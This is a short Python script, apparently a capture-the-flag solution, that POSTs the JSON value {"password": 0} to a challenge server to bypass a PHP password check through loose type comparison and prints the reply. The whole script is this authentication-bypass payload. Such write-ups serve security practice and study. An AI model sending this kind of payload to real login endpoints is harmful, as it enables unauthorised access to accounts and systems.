#!/usr/bin/python
# coding: utf-8

import requests

__author__ = 'ch4n3' # to see my write up visit http://chaneyoon.tistory.com/207
url = "http://burger.laboratorium.ee:8003/index.php"

data = {
    "data": '{"password": 0}'
}

content = requests.post(url, data=data).content



print "\n", content, "\n"
